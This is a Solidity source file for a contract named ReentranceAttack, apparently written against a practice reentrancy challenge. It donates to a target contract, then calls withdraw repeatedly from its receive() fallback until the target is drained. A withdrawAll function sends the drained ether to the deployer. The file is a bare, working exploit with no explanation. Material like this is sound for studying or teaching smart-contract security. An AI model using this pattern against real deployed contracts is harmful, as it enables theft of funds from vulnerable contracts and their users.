// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    IReentrance public target;
    uint public amount = 0.001 ether;
    address payable public owner; 

    constructor(address _target) public payable {
        target = IReentrance(_target);
        owner = payable(msg.sender); 
}

    function attack() external payable {
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }

    function withdrawAll() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}
